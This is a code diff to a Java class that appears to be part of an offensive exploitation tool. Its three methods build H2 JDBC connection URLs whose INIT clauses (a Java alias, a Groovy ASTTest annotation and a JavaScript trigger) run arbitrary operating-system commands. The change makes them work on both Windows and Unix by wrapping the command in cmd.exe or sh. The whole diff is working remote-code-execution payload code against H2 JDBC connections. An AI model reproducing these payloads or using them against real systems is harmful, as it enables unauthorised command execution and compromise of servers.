@@ -106,7 +106,7 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2] [Java] [Command] Cmd: " + cmd);
 
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\\;}'\\;" +
+                "INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"})\\;}'\\;".replace("COMMAND", cmd) +
                 "CALL EXEC ('" + cmd + "')\\;";
 
         Properties props = new Properties();
@@ -135,7 +135,7 @@ public abstract class DatabaseController implements Controller {
     public Properties h2GroovyCommand(String cmd) {
         System.out.println("[H2] [Groovy] [Command] Cmd: " + cmd);
 
-        String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")" + "})" + "def x";
+        String groovy = "@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"}) }) def x".replace("COMMAND", cmd);
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
 
         Properties props = new Properties();
@@ -149,7 +149,7 @@ public abstract class DatabaseController implements Controller {
     public Properties h2JavaScriptCommand(String cmd) {
         System.out.println("[H2] [JavaScript] [Command] Cmd: " + cmd);
 
-        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
+        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? [\"cmd.exe\", \"/c\", \"COMMAND\"] : [\"sh\", \"-c\", \"COMMAND\"])".replace("COMMAND", cmd);
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";
 
         Properties props = new Properties();
